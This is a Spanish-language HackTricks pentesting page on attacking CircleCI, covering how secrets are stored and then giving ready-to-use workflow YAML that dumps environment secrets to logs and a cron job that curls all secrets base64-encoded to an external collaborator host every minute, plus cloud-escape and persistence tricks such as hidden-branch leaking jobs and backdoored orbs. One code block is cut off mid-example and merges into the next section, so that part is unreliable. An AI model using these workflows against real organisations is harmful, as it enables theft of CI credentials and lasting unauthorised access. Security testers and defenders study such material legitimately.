# Seguridad de CircleCI

<details>

<summary><strong>¬°Apoya a HackTricks y obt√©n beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informaci√≥n b√°sica

[**CircleCI**](https://circleci.com/docs/2.0/about-circleci/) es una plataforma de Integraci√≥n Continua donde puedes **definir plantillas** que indiquen lo que quieres que haga con alg√∫n c√≥digo y cu√°ndo hacerlo. De esta manera, puedes **automatizar pruebas** o **despliegues** directamente **desde la rama principal de tu repositorio**, por ejemplo.

## Permisos

**CircleCI** **hereda los permisos** de github y bitbucket relacionados con la **cuenta** que inicia sesi√≥n.\
En mis pruebas comprob√© que siempre y cuando tengas **permisos de escritura sobre el repositorio en github**, podr√°s **administrar su configuraci√≥n de proyecto en CircleCI** (establecer nuevas claves ssh, obtener claves api del proyecto, crear nuevas ramas con nuevas configuraciones de CircleCI...).

Sin embargo, necesitas ser un **administrador del repositorio** para **convertir el repositorio en un proyecto de CircleCI**.

## Variables de entorno y secretos

Seg√∫n [**la documentaci√≥n**](https://circleci.com/docs/2.0/env-vars/), hay diferentes formas de **cargar valores en variables de entorno** dentro de un flujo de trabajo.

### Variables de entorno integradas

Cada contenedor ejecutado por CircleCI siempre tendr√° [**variables de entorno espec√≠ficas definidas en la documentaci√≥n**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables) como `CIRCLE_PR_USERNAME`, `CIRCLE_PROJECT_REPONAME` o `CIRCLE_USERNAME`.

### Texto claro

Puedes declararlas en texto claro dentro de un **comando**:

```yaml
- run:
    name: "set and echo"
    command: |
        SECRET="Un secreto"
        echo $SECRET
```

Puedes declararlas en texto claro dentro del **entorno de ejecuci√≥n**:

```yaml
- run:
    name: "set and echo"
    command: echo $SECRET
    environment:
        SECRET: Un secreto
```

Puedes declararlas en texto claro dentro del **entorno de trabajo de construcci√≥n**:

```yaml
jobs:
    build-job:
        docker:
            - image: cimg/base:2020.01
    environment:
        SECRET: Un secreto
```

Puedes declararlas en texto claro dentro del **entorno de un contenedor**:

```yaml
jobs:
    build-job:
        docker:
            - image: cimg/base:2020.01
                environment:
                    SECRET: Un secreto
```

### Secretos del proyecto

Estos son **secretos** que solo van a ser **accesibles** por el **proyecto** (por **cualquier rama**).\
Puedes verlos **declarados en** _https://app.circleci.com/settings/project/github/\<org\_name>/\<repo\_name>/environment-variables_

![](<../.gitbook/assets/image (50).png>)

{% hint style="danger" %}
La funcionalidad "**Importar variables**" permite **importar variables de otros proyectos** a este.
{% endhint %}

### Secretos de contexto

Estos son secretos que son **de toda la organizaci√≥n**. Por **defecto, cualquier repositorio** va a poder **acceder a cualquier secreto** almacenado aqu√≠:

![](<../.gitbook/assets/image (80).png>)

{% hint style="success" %}
Sin embargo, ten en cuenta que se puede **seleccionar un grupo diferente** (en lugar de Todos los miembros) para dar acceso a los secretos solo a personas espec√≠ficas.\
Actualmente, esta es una de las mejores formas de **aumentar la seguridad de los secretos**, para no permitir que todos los accedan, sino solo algunas personas.
{% endhint %}

## Ataques

### Buscar secretos en texto claro

Si tienes **acceso al VCS** (como github), revisa el archivo `.circleci/config.yml` de **cada repositorio en cada rama** y **busca** posibles **secretos en texto claro** almacenados all√≠.

### Enumeraci√≥n de variables de entorno y contexto secreto

Revisando el c√≥digo, puedes encontrar **todos los nombres de secretos** que se est√°n **usando** en cada archivo `.circleci/config.yml`. Tambi√©n puedes obtener los **nombres de contexto** de esos archivos o revisarlos en la consola web: _https://app.circleci.com/settings/organization/github/\<org\_name>/contexts_.

### Exfiltrar secretos del proyecto

{% hint style="warning" %}
Para **exfiltrar TODOS** los secretos del proyecto y del contexto solo necesitas tener **acceso de ESCRITURA** a **solo 1 repositorio** en toda la organizaci√≥n de github (_y tu cuenta debe tener acceso a los contextos, pero por defecto todos pueden acceder a todos los contextos_).
{% endhint %}

{% hint style="danger" %}
La funcionalidad "**Importar variables**" permite **importar variables de otros proyectos** a este. Por lo tanto, un atacante podr√≠a **importar todas las variables del proyecto de todos los repositorios** y luego **exfiltrarlas todas juntas**.
{% endhint %}

Todos los secretos del proyecto siempre se establecen en el entorno de los trabajos, por lo que simplemente llamando a env y ofusc√°ndolo en base64 se exfiltrar√°n los secretos en la **consola de registro web de los flujos de trabajo**:

```yaml
version: 2.1

jobs:
  exfil-env:
    docker:
      - image: cimg/base:stable
    steps:
      - checkout
      - run:
          name: "Exfil env"
          command: "env | base64"

workflows:
  exfil-env-workflow:
    jobs:
      - exfil-env
```

Si **no tienes acceso a la consola web** pero tienes **acceso al repositorio** y sabes que se usa CircleCI, simplemente puedes **crear un flujo de trabajo** que se **dispare cada minuto** y que **exfiltre los secretos a una direcci√≥n externa**:

```yaml
version: 2.1

jobs:
  exfil-env:
    docker:
      - image: cimg/base:stable
    steps:
      - checkout
      - run:
          name: "Exfil env"
          command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# Filtro por la rama del repositorio donde se encuentra este archivo config.yaml: circleci-project-setup
workflows:
  exfil-env-workflow:
    triggers:
      - schedule:
          cron: "* * * * *"
          filters:
            branches:
              only:
                - circleci-project-setup
    jobs:
      - exfil-env
```

### Exfiltrar secretos de contexto

Necesitas **especificar el nombre del contexto** (esto tambi√©n exfiltrar√° los secretos del proyecto):

```yaml
version: 2
### Escape a la nube

**CircleCI** te da la opci√≥n de ejecutar **tus construcciones en sus m√°quinas o en las tuyas**.\
Por defecto, sus m√°quinas est√°n ubicadas en GCP, y al principio no podr√°s encontrar nada relevante. Sin embargo, si una v√≠ctima est√° ejecutando las tareas en **sus propias m√°quinas (potencialmente, en un entorno en la nube)**, podr√≠as encontrar un **punto final de metadatos en la nube con informaci√≥n interesante**.

Ten en cuenta que en los ejemplos anteriores se lanz√≥ todo dentro de un contenedor de Docker, pero tambi√©n puedes **pedir que se lance una m√°quina VM** (que puede tener diferentes permisos en la nube):

```yaml
jobs:
  exfil-env:
    #docker:
    #  - image: cimg/base:stable
    machine:
      image: ubuntu-2004:current
```

O incluso un contenedor de Docker con acceso a un servicio de Docker remoto:

```yaml
jobs:
  exfil-env:
    docker:
      - image: cimg/base:stable
    steps:
      - checkout
      - setup_remote_docker:
          version: 19.03.13
```

### Persistencia

* Es posible **crear tokens de usuario en CircleCI** para acceder a los puntos finales de la API con el acceso de los usuarios.
  * _https://app.circleci.com/settings/user/tokens_
* Es posible **crear tokens de proyectos** para acceder al proyecto con los permisos otorgados al token.
  * _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
* Es posible **agregar claves SSH** a los proyectos.
  * _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_
* Es posible **crear un trabajo cron en una rama oculta** en un proyecto inesperado que est√° **filtrando** todas las **variables de entorno de contexto** todos los d√≠as.
  * O incluso crear en una rama / modificar un trabajo conocido que **filtrar√°** todos los contextos y **secretos de proyectos** todos los d√≠as.
* Si eres propietario de Github, puedes **permitir √≥rbitas no verificadas** y configurar una en un trabajo como **puerta trasera**
* Puedes encontrar una **vulnerabilidad de inyecci√≥n de comandos** en alguna tarea e **inyectar comandos** a trav√©s de un **secreto** modificando su valor.

<details>

<summary><strong>¬°Apoya a HackTricks y obt√©n beneficios!</strong></summary>

* Si quieres ver tu **empresa anunciada en HackTricks** o si quieres acceder a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PR a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>